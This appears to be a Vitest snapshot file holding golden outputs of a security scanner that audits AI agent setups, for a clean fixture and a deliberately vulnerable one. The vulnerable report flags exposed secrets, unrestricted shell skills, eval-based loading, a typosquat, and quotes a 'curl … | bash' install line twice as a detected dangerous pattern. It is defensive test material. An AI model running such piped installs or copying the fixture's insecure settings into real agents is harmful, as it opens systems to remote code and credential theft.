@@ -1,0 +1,3046 @@
+// Vitest Snapshot v1, https://vitest.dev/guide/snapshot.html
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > clean-agent > matches the golden console output 1`] = `
+"Chaperone scan report
+Target: <TARGET_ROOT>
+Scanned at <TIMESTAMP> — chaperone v0.1.0
+
+No findings.
+
+Summary: 0 findings (0 critical, 0 high, 0 medium, 0 low, 0 info) — posture score 100/100 (A)
+Inspected 16 paths, skipped 0."
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > clean-agent > matches the golden gha output 1`] = `"::notice::Chaperone scan: 0 findings found."`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > clean-agent > matches the golden html output 1`] = `
+"<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Chaperone scan report</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; max-width: 900px; margin: 2rem auto; padding: 0 1rem; color: #1f2937; background: #ffffff; line-height: 1.5; }
+  h1 { margin-bottom: 0.25rem; }
+  .meta { color: #6b7280; font-size: 0.9rem; margin-bottom: 1.5rem; }
+  .summary { background: #f3f4f6; border-radius: 8px; padding: 1rem 1.25rem; margin-bottom: 2rem; }
+  .summary .score { font-size: 1.5rem; font-weight: 700; }
+  .not-resolved { background: #fef2f2; border: 1px solid #fecaca; border-radius: 8px; padding: 1rem 1.25rem; margin-bottom: 1.5rem; }
+  .severity-group { margin-bottom: 2rem; }
+  .finding { border-left: 4px solid; background: #f9fafb; border-radius: 4px; padding: 0.75rem 1rem; margin-bottom: 0.75rem; }
+  .finding h3 { margin: 0 0 0.4rem; font-size: 1rem; }
+  .check-id { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; color: #6b7280; font-weight: 400; }
+  .finding p { margin: 0.25rem 0; font-size: 0.92rem; }
+  .location code, .skipped code { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
+  .no-findings { color: #059669; font-weight: 600; }
+  .skipped ul { padding-left: 1.25rem; }
+  .skipped li { font-size: 0.9rem; color: #6b7280; }
+</style>
+</head>
+<body>
+<h1>Chaperone scan report</h1>
+<p class="meta">Target: <code><TARGET_ROOT></code><br>
+Scanned at <TIMESTAMP> — chaperone v0.1.0</p>
+
+<div class="summary">
+  <div class="score">Posture score: 100/100 (A)</div>
+  <div>0 findings — 0 critical, 0 high, 0 medium, 0 low, 0 info</div>
+  <div>Inspected 16 paths, skipped 0.</div>
+</div>
+<p class="no-findings">No findings.</p>
+
+</body>
+</html>
+"
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > clean-agent > matches the golden json output 1`] = `
+"{
+  "tool": {
+    "name": "chaperone",
+    "version": "0.1.0"
+  },
+  "target": "<TARGET_ROOT>",
+  "targetRootResolved": true,
+  "timestamp": "<TIMESTAMP>",
+  "summary": {
+    "totalFindings": 0,
+    "bySeverity": {
+      "critical": 0,
+      "high": 0,
+      "medium": 0,
+      "low": 0,
+      "info": 0
+    },
+    "score": 100,
+    "band": "A"
+  },
+  "findings": [],
+  "inspected": [
+    {
+      "path": "<TARGET_ROOT>/config.yaml",
+      "kind": "config"
+    },
+    {
+      "path": "<TARGET_ROOT>/logs/agent.log",
+      "kind": "log-file"
+    },
+    {
+      "path": "<TARGET_ROOT>/.git",
+      "kind": "other"
+    },
+    {
+      "path": "<TARGET_ROOT>/.gitignore",
+      "kind": "gitignore"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/messenger/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/messenger/index.js",
+      "kind": "skill-source"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/messenger/package-lock.json",
+      "kind": "skill-lockfile"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/notes/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/notes/index.js",
+      "kind": "skill-source"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/notes/package-lock.json",
+      "kind": "skill-lockfile"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/py-notes/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/py-notes/index.py",
+      "kind": "skill-source"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/py-notes/package-lock.json",
+      "kind": "skill-lockfile"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/weather/package.json",
+      "kind": "skill-manifest"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/weather/index.js",
+      "kind": "skill-source"
+    },
+    {
+      "path": "<TARGET_ROOT>/skills/weather/package-lock.json",
+      "kind": "skill-lockfile"
+    }
+  ],
+  "skipped": []
+}"
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > clean-agent > matches the golden markdown output 1`] = `
+"# Chaperone scan report
+
+**Target:** \`<TARGET_ROOT>\`
+**Scanned at:** <TIMESTAMP> — chaperone v0.1.0
+
+No findings.
+
+**Summary:** 0 findings (0 critical, 0 high, 0 medium, 0 low, 0 info) — posture score 100/100 (A)
+Inspected 16 paths, skipped 0."
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > clean-agent > matches the golden sarif output 1`] = `
+"{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "chaperone",
+          "informationUri": "https://github.com/AlpayAltuntas/chaperone",
+          "version": "0.1.0",
+          "rules": []
+        }
+      },
+      "results": []
+    }
+  ]
+}"
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > vulnerable-agent > matches the golden console output 1`] = `
+"Chaperone scan report
+Target: <TARGET_ROOT>
+Scanned at <TIMESTAMP> — chaperone v0.1.0
+
+CRITICAL (5)
+
+  [CHAP-AGY-001] Unrestricted shell execution
+    Skill 'command-relay' can execute arbitrary shell commands with no detected command allowlist or confirmation gate.
+    Location: <TARGET_ROOT>/skills/command-relay/package.json (command-relay)
+    OWASP: LLM08: Excessive Agency
+    Remediation: Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution.
+
+  [CHAP-AGY-001] Unrestricted shell execution
+    Skill 'py-cache-cleaner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate.
+    Location: <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)
+    OWASP: LLM08: Excessive Agency
+    Remediation: Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution.
+
+  [CHAP-AGY-001] Unrestricted shell execution
+    Skill 'shell-runner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate.
+    Location: <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner)
+    OWASP: LLM08: Excessive Agency
+    Remediation: Constrain the skill to an explicit command allowlist, require confirmation for shell actions, or sandbox its execution.
+
+  [CHAP-SUP-005] Obfuscated or dynamically-evaluated code
+    Skill 'plugin-loader' uses eval()/Function() to run dynamically-constructed code — a common way to hide a malicious payload from static review.
+    Location: <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)
+    OWASP: LLM05: Supply Chain
+    Remediation: Avoid dynamic code evaluation entirely; if truly needed, review the exact string being evaluated by hand and vendor/pin it rather than constructing it at runtime.
+
+  [CHAP-NET-001] Gateway bound beyond localhost
+    The gateway is bound to '0.0.0.0', not localhost, making it reachable from other hosts on the network.
+    Location: <TARGET_ROOT>/config.yaml (gateway.host)
+    OWASP: LLM06 / general
+    Remediation: Bind the gateway to 127.0.0.1/localhost; put anything that must be remote behind a tunnel with authentication.
+
+HIGH (20)
+
+  [CHAP-SEC-001] Plaintext secrets in config
+    Config field 'llm.api_key' holds a literal secret value (sk-…wxyz) instead of an environment-variable reference.
+    Location: <TARGET_ROOT>/config.yaml:6 (llm.api_key)
+    OWASP: LLM06: Sensitive Information Disclosure
+    Remediation: Move this value to an environment variable or a secrets manager and reference it indirectly in config (e.g. \${VAR} or env:VAR).
+
+  [CHAP-SEC-001] Plaintext secrets in config
+    Config field 'channels.telegram.bot_token' holds a literal secret value (123…AA11) instead of an environment-variable reference.
+    Location: <TARGET_ROOT>/config.yaml:11 (channels.telegram.bot_token)
+    OWASP: LLM06: Sensitive Information Disclosure
+    Remediation: Move this value to an environment variable or a secrets manager and reference it indirectly in config (e.g. \${VAR} or env:VAR).
+
+  [CHAP-SEC-002] Secrets in a git-tracked path
+    The config file holds a literal secret and sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore.
+    Location: <TARGET_ROOT>/config.yaml (config.yaml)
+    OWASP: LLM06: Sensitive Information Disclosure
+    Remediation: Add the config/secret file to .gitignore, and rotate any key that may already have been committed.
+
+  [CHAP-SEC-005] Secret already present in existing log content
+    A secret-shaped value for 'api_key' (sk-…real) was found in the existing log file content — a past run appears to have already leaked it, regardless of the current logging configuration.
+    Location: <TARGET_ROOT>/logs/agent.log (api_key)
+    OWASP: LLM06: Sensitive Information Disclosure
+    Remediation: Rotate the leaked credential, purge or redact the log file, and fix the logging behavior that caused it to be written (see CHAP-SEC-004/CHAP-OBS-002).
+
+  [CHAP-SEC-006] Sidecar secret file exposed
+    Sidecar secret file 'secrets.yaml' holds a literal secret and it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore; it is readable by group or other (mode 644).
+    Location: <TARGET_ROOT>/secrets.yaml (yaml)
+    OWASP: LLM06: Sensitive Information Disclosure
+    Remediation: Add the file to .gitignore, rotate any key that may already have been committed, and restrict it to owner-only access (chmod 600).
+
+  [CHAP-AGY-002] Unrestricted filesystem access
+    Skill 'file-writer' writes/deletes files with no detected scoping to a fixed workspace directory — it can plausibly read/write anywhere the process can reach.
+    Location: <TARGET_ROOT>/skills/file-writer/package.json (file-writer)
+    OWASP: LLM08: Excessive Agency
+    Remediation: Scope the skill's file access to a dedicated workspace directory and deny path traversal outside it.
+
+  [CHAP-AGY-003] Destructive action without confirmation
+    Skill 'file-writer' can perform a destructive/irreversible action (delete) with no declared confirmation gate.
+    Location: <TARGET_ROOT>/skills/file-writer/package.json (file-writer)
+    OWASP: LLM08: Excessive Agency
+    Remediation: Require explicit confirmation before this action runs (or add a dry-run mode) before treating it as safe to invoke.
+
+  [CHAP-AGY-003] Destructive action without confirmation
+    Skill 'py-cache-cleaner' can perform a destructive/irreversible action (delete) with no declared confirmation gate.
+    Location: <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)
+    OWASP: LLM08: Excessive Agency
+    Remediation: Require explicit confirmation before this action runs (or add a dry-run mode) before treating it as safe to invoke.
+
+  [CHAP-SUP-001] Skill from an unverified source
+    Skill 'command-relay' is not installed at a pinned version/commit (unpinned).
+    Location: <TARGET_ROOT>/skills/command-relay/package.json (command-relay)
+    OWASP: LLM05: Supply Chain
+    Remediation: Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.
+
+  [CHAP-SUP-001] Skill from an unverified source
+    Skill 'file-writer' is not installed at a pinned version/commit (unpinned).
+    Location: <TARGET_ROOT>/skills/file-writer/package.json (file-writer)
+    OWASP: LLM05: Supply Chain
+    Remediation: Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.
+
+  [CHAP-SUP-001] Skill from an unverified source
+    Skill 'plugin-loader' is not installed at a pinned version/commit (unpinned).
+    Location: <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)
+    OWASP: LLM05: Supply Chain
+    Remediation: Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.
+
+  [CHAP-SUP-001] Skill from an unverified source
+    Skill 'py-cache-cleaner' is not installed at a pinned version/commit (unpinned).
+    Location: <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)
+    OWASP: LLM05: Supply Chain
+    Remediation: Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.
+
+  [CHAP-SUP-001] Skill from an unverified source
+    Skill 'shell-runner' is not installed at a pinned version/commit (unpinned).
+    Location: <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner)
+    OWASP: LLM05: Supply Chain
+    Remediation: Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.
+
+  [CHAP-SUP-001] Skill from an unverified source
+    Skill 'web-fetcher' is not installed at a pinned version/commit (unpinned).
+    Location: <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher)
+    OWASP: LLM05: Supply Chain
+    Remediation: Pin the skill to an explicit version or commit, prefer reviewed sources, and verify the author.
+
+  [CHAP-SUP-003] Known-vulnerable dependency
+    Skill 'plugin-loader' depends on lodash@^4.17.15 (matched as 4.17.15), which hits 6 known vulnerabilities in Chaperone's offline snapshot (GHSA-29mw-wpgm-hmr9, GHSA-35jh-r3h4-6jhm, GHSA-f23m-r3pf-42rh, GHSA-p6mc-m468-83gw, GHSA-r5fr-rjxr-66jc, GHSA-xxjr-mmjv-4gpg) — most severe: "Command Injection in lodash" (high), fixed in 4.17.21.
+    Location: <TARGET_ROOT>/skills/plugin-loader/package.json (lodash@^4.17.15)
+    OWASP: LLM05: Supply Chain
+    Remediation: Upgrade lodash to 4.17.21 or later.
+
+  [CHAP-INJ-001] Untrusted input flows straight to the model
+    At least one inbound message channel is active, but config has no trust boundary marking untrusted content before it reaches the model.
+    Location: <TARGET_ROOT>/config.yaml (trust.mark_untrusted_input)
+    OWASP: LLM01: Prompt Injection
+    Remediation: Mark untrusted inbound content explicitly and keep it separated from system instructions in the prompt; filter before forwarding it to the model.
+
+  [CHAP-INJ-002] Tool output treated as trusted
+    Skill 'command-relay' traces a network/filesystem result directly into a shell-exec call's argument — a confirmed tool-output-to-shell-execution chain, not just a shape-match.
+    Location: <TARGET_ROOT>/skills/command-relay/package.json (command-relay)
+    OWASP: LLM02: Insecure Output Handling
+    Remediation: Validate/escape a tool's output before it can drive another tool; never auto-execute model or tool output.
+
+  [CHAP-INJ-003] Actions triggerable by inbound messages without an allowlist
+    At least one inbound message channel is active, but no channel/sender-to-tool allowlist restricts which tools an inbound message can invoke.
+    Location: <TARGET_ROOT>/config.yaml (trust.tool_allowlist)
+    OWASP: LLM01: Prompt Injection / LLM08: Excessive Agency
+    Remediation: Restrict which tools each channel/sender can invoke with an explicit allowlist.
+
+  [CHAP-INJ-004] Auto-execution of links/commands from messages
+    Config auto-executes links/commands found in inbound messages with no confirmation step.
+    Location: <TARGET_ROOT>/config.yaml (trust.auto_execute_links)
+    OWASP: LLM01: Prompt Injection
+    Remediation: Disable auto-execution of links/commands found in messages; require explicit confirmation instead.
+
+  [CHAP-NET-002] Missing or weak auth on the gateway control API
+    The gateway's control API has weak authentication: the auth token is empty or a common default value.
+    Location: <TARGET_ROOT>/config.yaml (gateway.auth.token)
+    OWASP: General
+    Remediation: Require a strong, randomly-generated token for the gateway control API and rotate any default value.
+
+MEDIUM (18)
+
+  [CHAP-SEC-003] Overly permissive file permissions
+    The config file is readable by group or other (mode 644), so other local users/processes can read any secrets it holds.
+    Location: <TARGET_ROOT>/config.yaml (mode 644)
+    OWASP: LLM06: Sensitive Information Disclosure
+    Remediation: Restrict the file to owner-only access, e.g. \`chmod 600\` the config file (and \`chmod 700\` its directory).
+
+  [CHAP-SEC-004] Secrets likely to reach logs
+    Secrets are likely to reach logs: log level 'debug' is verbose while literal secrets are configured; the log file is readable by group or other.
+    Location: <TARGET_ROOT>/logs/agent.log (logging)
+    OWASP: LLM06: Sensitive Information Disclosure
+    Remediation: Raise the log level away from debug/trace, redact secrets before logging, and restrict the log file to owner-only access.
+
+  [CHAP-AGY-004] Broad network egress from a skill
+    Skill 'command-relay' can call arbitrary external endpoints — no domain allowlist is declared.
+    Location: <TARGET_ROOT>/skills/command-relay/package.json (command-relay)
+    OWASP: LLM08: Excessive Agency / LLM06
+    Remediation: Allowlist the specific destination domain(s) this skill needs and log outbound calls.
+
+  [CHAP-AGY-004] Broad network egress from a skill
+    Skill 'plugin-loader' can call arbitrary external endpoints — no domain allowlist is declared.
+    Location: <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)
+    OWASP: LLM08: Excessive Agency / LLM06
+    Remediation: Allowlist the specific destination domain(s) this skill needs and log outbound calls.
+
+  [CHAP-AGY-004] Broad network egress from a skill
+    Skill 'web-fetcher' can call arbitrary external endpoints — no domain allowlist is declared.
+    Location: <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher)
+    OWASP: LLM08: Excessive Agency / LLM06
+    Remediation: Allowlist the specific destination domain(s) this skill needs and log outbound calls.
+
+  [CHAP-SUP-002] No integrity verification for skill dependencies
+    Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+    Location: <TARGET_ROOT>/skills/command-relay/package.json (command-relay)
+    OWASP: LLM05: Supply Chain
+    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
+
+  [CHAP-SUP-002] No integrity verification for skill dependencies
+    Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+    Location: <TARGET_ROOT>/skills/file-writer/package.json (file-writer)
+    OWASP: LLM05: Supply Chain
+    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
+
+  [CHAP-SUP-002] No integrity verification for skill dependencies
+    Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+    Location: <TARGET_ROOT>/skills/plugin-loader/package.json (plugin-loader)
+    OWASP: LLM05: Supply Chain
+    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
+
+  [CHAP-SUP-002] No integrity verification for skill dependencies
+    Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+    Location: <TARGET_ROOT>/skills/py-cache-cleaner/package.json (py-cache-cleaner)
+    OWASP: LLM05: Supply Chain
+    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
+
+  [CHAP-SUP-002] No integrity verification for skill dependencies
+    Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+    Location: <TARGET_ROOT>/skills/shell-runner/package.json (shell-runner)
+    OWASP: LLM05: Supply Chain
+    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
+
+  [CHAP-SUP-002] No integrity verification for skill dependencies
+    Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+    Location: <TARGET_ROOT>/skills/web-fetcher/package.json (web-fetcher)
+    OWASP: LLM05: Supply Chain
+    Remediation: Commit a lockfile (package-lock.json/yarn.lock/pnpm-lock.yaml) alongside the manifest and enable integrity checks.
+
+  [CHAP-SUP-004] Dangerous install pattern
+    Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/setup.sh | bash) in package.json#scripts.postinstall.
+    Location: package.json#scripts.postinstall (shell-runner)
+    OWASP: LLM05: Supply Chain
+    Remediation: Review the install script by hand; prefer a vetted, minimal setup with no piped-shell or sudo steps.
+
+  [CHAP-SUP-004] Dangerous install pattern
+    Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/bootstrap.sh | bash, sudo, apt-get install) in <TARGET_ROOT>/skills/shell-runner/install.sh.
+    Location: <TARGET_ROOT>/skills/shell-runner/install.sh (shell-runner)
+    OWASP: LLM05: Supply Chain
+    Remediation: Review the install script by hand; prefer a vetted, minimal setup with no piped-shell or sudo steps.
+
+  [CHAP-SUP-006] Typosquat-risk dependency name
+    Skill 'plugin-loader' depends on 'reqeust', which is suspiciously close to the well-known package 'request' — possible typosquat.
+    Location: <TARGET_ROOT>/skills/plugin-loader/package.json (reqeust)
+    OWASP: LLM05: Supply Chain
+    Remediation: Double check that 'reqeust' is the package you actually intend to use, not a typosquat of 'request'.
+
+  [CHAP-NET-003] Plaintext transport on the gateway
+    The gateway is configured with TLS disabled, so traffic (including any auth token) travels in plaintext.
+    Location: <TARGET_ROOT>/config.yaml (gateway.tls)
+    OWASP: General
+    Remediation: Enable TLS on the gateway and disable any plaintext fallback.
+
+  [CHAP-OBS-001] No audit log of agent actions
+    Logging is configured but the audit log of tool invocations/actions is disabled.
+    Location: <TARGET_ROOT>/config.yaml (logging.audit.enabled)
+    OWASP: LLM08-adjacent
+    Remediation: Enable an append-only audit log of every tool invocation/action the agent takes.
+
+  [CHAP-OBS-002] Sensitive data in plaintext logs
+    Logging config does not confirm secrets/message bodies are redacted before being written to logs.
+    Location: <TARGET_ROOT>/logs/agent.log (logging.redact_secrets)
+    OWASP: LLM06: Sensitive Information Disclosure
+    Remediation: Redact secrets and sensitive message content before logging, and restrict access to the log file.
+
+  [CHAP-OBS-004] Persistent memory/state store exposed
+    The persistent memory/state store is exposed: it is readable by group or other (mode 755); it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore.
+    Location: <TARGET_ROOT>/memory (memory_dir)
+    OWASP: LLM06: Sensitive Information Disclosure
+    Remediation: Restrict the memory/state directory to owner-only access (chmod 700) and add it to .gitignore — it can accumulate sensitive conversational content over time.
+
+LOW (1)
+
+  [CHAP-OBS-003] No documented kill switch / revocation path
+    No documented quick way to stop the agent and revoke its access was found at the install root.
+    Location: <TARGET_ROOT> (KILL_SWITCH.md / STOP.md / kill-switch.sh / revoke.sh)
+    OWASP: General
+    Remediation: Document a kill switch (how to stop the agent) and a script or checklist to revoke/rotate its credentials.
+
+
+Summary: 44 findings (5 critical, 20 high, 18 medium, 1 low, 0 info) — posture score 0/100 (F)
+Inspected 18 paths, skipped 0."
+`;
+
+exports[`reporter output — golden-file snapshots (improvement_plan.md 5.1) > vulnerable-agent > matches the golden gha output 1`] = `
+"::error file=<TARGET_ROOT>/config.yaml,line=6,title=CHAP-SEC-001%3A Plaintext secrets in config::Config field 'llm.api_key' holds a literal secret value (sk-…wxyz) instead of an environment-variable reference.
+::error file=<TARGET_ROOT>/config.yaml,line=11,title=CHAP-SEC-001%3A Plaintext secrets in config::Config field 'channels.telegram.bot_token' holds a literal secret value (123…AA11) instead of an environment-variable reference.
+::error file=<TARGET_ROOT>/config.yaml,title=CHAP-SEC-002%3A Secrets in a git-tracked path::The config file holds a literal secret and sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore.
+::warning file=<TARGET_ROOT>/config.yaml,title=CHAP-SEC-003%3A Overly permissive file permissions::The config file is readable by group or other (mode 644), so other local users/processes can read any secrets it holds.
+::warning file=<TARGET_ROOT>/logs/agent.log,title=CHAP-SEC-004%3A Secrets likely to reach logs::Secrets are likely to reach logs: log level 'debug' is verbose while literal secrets are configured; the log file is readable by group or other.
+::error file=<TARGET_ROOT>/logs/agent.log,title=CHAP-SEC-005%3A Secret already present in existing log content::A secret-shaped value for 'api_key' (sk-…real) was found in the existing log file content — a past run appears to have already leaked it, regardless of the current logging configuration.
+::error file=<TARGET_ROOT>/secrets.yaml,title=CHAP-SEC-006%3A Sidecar secret file exposed::Sidecar secret file 'secrets.yaml' holds a literal secret and it sits inside a git repository (<TARGET_ROOT>) without being covered by its .gitignore; it is readable by group or other (mode 644).
+::error file=<TARGET_ROOT>/skills/command-relay/package.json,title=CHAP-AGY-001%3A Unrestricted shell execution::Skill 'command-relay' can execute arbitrary shell commands with no detected command allowlist or confirmation gate.
+::error file=<TARGET_ROOT>/skills/py-cache-cleaner/package.json,title=CHAP-AGY-001%3A Unrestricted shell execution::Skill 'py-cache-cleaner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate.
+::error file=<TARGET_ROOT>/skills/shell-runner/package.json,title=CHAP-AGY-001%3A Unrestricted shell execution::Skill 'shell-runner' can execute arbitrary shell commands with no detected command allowlist or confirmation gate.
+::error file=<TARGET_ROOT>/skills/file-writer/package.json,title=CHAP-AGY-002%3A Unrestricted filesystem access::Skill 'file-writer' writes/deletes files with no detected scoping to a fixed workspace directory — it can plausibly read/write anywhere the process can reach.
+::error file=<TARGET_ROOT>/skills/file-writer/package.json,title=CHAP-AGY-003%3A Destructive action without confirmation::Skill 'file-writer' can perform a destructive/irreversible action (delete) with no declared confirmation gate.
+::error file=<TARGET_ROOT>/skills/py-cache-cleaner/package.json,title=CHAP-AGY-003%3A Destructive action without confirmation::Skill 'py-cache-cleaner' can perform a destructive/irreversible action (delete) with no declared confirmation gate.
+::warning file=<TARGET_ROOT>/skills/command-relay/package.json,title=CHAP-AGY-004%3A Broad network egress from a skill::Skill 'command-relay' can call arbitrary external endpoints — no domain allowlist is declared.
+::warning file=<TARGET_ROOT>/skills/plugin-loader/package.json,title=CHAP-AGY-004%3A Broad network egress from a skill::Skill 'plugin-loader' can call arbitrary external endpoints — no domain allowlist is declared.
+::warning file=<TARGET_ROOT>/skills/web-fetcher/package.json,title=CHAP-AGY-004%3A Broad network egress from a skill::Skill 'web-fetcher' can call arbitrary external endpoints — no domain allowlist is declared.
+::error file=<TARGET_ROOT>/skills/command-relay/package.json,title=CHAP-SUP-001%3A Skill from an unverified source::Skill 'command-relay' is not installed at a pinned version/commit (unpinned).
+::error file=<TARGET_ROOT>/skills/file-writer/package.json,title=CHAP-SUP-001%3A Skill from an unverified source::Skill 'file-writer' is not installed at a pinned version/commit (unpinned).
+::error file=<TARGET_ROOT>/skills/plugin-loader/package.json,title=CHAP-SUP-001%3A Skill from an unverified source::Skill 'plugin-loader' is not installed at a pinned version/commit (unpinned).
+::error file=<TARGET_ROOT>/skills/py-cache-cleaner/package.json,title=CHAP-SUP-001%3A Skill from an unverified source::Skill 'py-cache-cleaner' is not installed at a pinned version/commit (unpinned).
+::error file=<TARGET_ROOT>/skills/shell-runner/package.json,title=CHAP-SUP-001%3A Skill from an unverified source::Skill 'shell-runner' is not installed at a pinned version/commit (unpinned).
+::error file=<TARGET_ROOT>/skills/web-fetcher/package.json,title=CHAP-SUP-001%3A Skill from an unverified source::Skill 'web-fetcher' is not installed at a pinned version/commit (unpinned).
+::warning file=<TARGET_ROOT>/skills/command-relay/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'command-relay' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+::warning file=<TARGET_ROOT>/skills/file-writer/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'file-writer' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+::warning file=<TARGET_ROOT>/skills/plugin-loader/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'plugin-loader' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+::warning file=<TARGET_ROOT>/skills/py-cache-cleaner/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'py-cache-cleaner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+::warning file=<TARGET_ROOT>/skills/shell-runner/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'shell-runner' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+::warning file=<TARGET_ROOT>/skills/web-fetcher/package.json,title=CHAP-SUP-002%3A No integrity verification for skill dependencies::Skill 'web-fetcher' declares dependencies but has no lockfile, so installs aren't hash-verified or reproducible.
+::error file=<TARGET_ROOT>/skills/plugin-loader/package.json,title=CHAP-SUP-003%3A Known-vulnerable dependency::Skill 'plugin-loader' depends on lodash@^4.17.15 (matched as 4.17.15), which hits 6 known vulnerabilities in Chaperone's offline snapshot (GHSA-29mw-wpgm-hmr9, GHSA-35jh-r3h4-6jhm, GHSA-f23m-r3pf-42rh, GHSA-p6mc-m468-83gw, GHSA-r5fr-rjxr-66jc, GHSA-xxjr-mmjv-4gpg) — most severe: "Command Injection in lodash" (high), fixed in 4.17.21.
+::warning file=package.json#scripts.postinstall,title=CHAP-SUP-004%3A Dangerous install pattern::Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/setup.sh | bash) in package.json#scripts.postinstall.
+::warning file=<TARGET_ROOT>/skills/shell-runner/install.sh,title=CHAP-SUP-004%3A Dangerous install pattern::Skill 'shell-runner' install script contains a dangerous pattern (curl -fsSL https://example.invalid/bootstrap.sh | bash, sudo, apt-get install) in <TARGET_ROOT>/skills/shell-runner/install.sh.
+::error file=<TARGET_ROOT>/skills/plugin-loader/package.json,title=CHAP-SUP-005%3A Obfuscated or dynamically-evaluated code::Skill 'plugin-loader' uses eval()/Function() to run dynamically-constructed code — a common way to hide a malicious payload from static review.
+::warning file=<TARGET_ROOT>/skills/plugin-loader/package.json,title=CHAP-SUP-006%3A Typosquat-risk dependency name::Skill 'plugin-loader' depends on 'reqeust', which is suspiciously close to the well-known package 'request' — possible typosquat.
+::error file=<TARGET_ROOT>/config.yaml,title=CHAP-INJ-001%3A Untrusted input flows straight to the model::At least one inbound message channel is active, but config has no trust boundary marking untrusted content before it reaches the model.
+::error file=<TARGET_ROOT>/skills/command-relay/package.json,title=CHAP-INJ-002%3A Tool output treated as trusted::Skill 'command-relay' traces a network/filesystem result directly into a shell-exec call's argument — a confirmed tool-output-to-shell-execution chain, not just a shape-match.
+::error file=<TARGET_ROOT>/config.yaml,title=CHAP-INJ-003%3A Actions triggerable by inbound messages without an allowlist::At least one inbound message channel is active, but no channel/sender-to-tool allowlist restricts which tools an inbound message can invoke.
+::error file=<TARGET_ROOT>/config.yaml,title=CHAP-INJ-004%3A Auto-execution of links/commands from messages::Config auto-executes links/commands found in inbound messages with no confirmation step.
